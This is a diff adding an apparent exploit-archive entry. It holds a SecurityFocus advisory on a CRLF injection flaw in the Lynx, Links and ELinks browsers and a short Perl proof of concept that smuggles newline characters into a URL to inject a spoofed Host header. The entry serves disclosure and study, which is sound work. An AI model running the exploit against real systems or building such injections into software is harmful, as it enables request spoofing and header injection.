@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/5499/info
+
+A CRLF injection vulnerability has been reported for Lynx that may allow an attacker to include extra HTTP headers when viewing web pages. If Lynx is called from the command line, carriage return and line feed (CRLF) characters may be included in the specified URL. These characters are not escaped when the input is used to construct a HTTP request.
+
+Exploitation of this flaw may allow an attacker to inject additional HTTP headers into a request. Abuse of the 'Host' header may cause the request to be served as if made to a different domain, possibly providing the attacker with more control over the content returned.
+
+This vulnerability has been reported for Lynx versions 2.8.4rel.1, 2.8.5dev.8, 2.8.3rel.1 and 2.8.2rel.1. It is not known whether other versions are affected.
+
+*** Links 0.9.6 and ELinks have also been reported as being vulnerable. Some versions of Links and ELinks URL encode space characters so an attacker needs to use tab characters, instead of spaces, to exploit the issue on these browsers.
+
+#!/usr/bin/perl --
+# Ulf Harnhammar 2002
+# example: ./exploit www.site1.st www.site2.st
+# will show www.site2.st
+
+die "$0 hostone hosttwo\n" if @ARGV != 2;
+
+exec('lynx "'.
+     "http://$ARGV[0]/ HTTP/1.0\012".
+     "Host: $ARGV[1]\012\012".
+     '"');
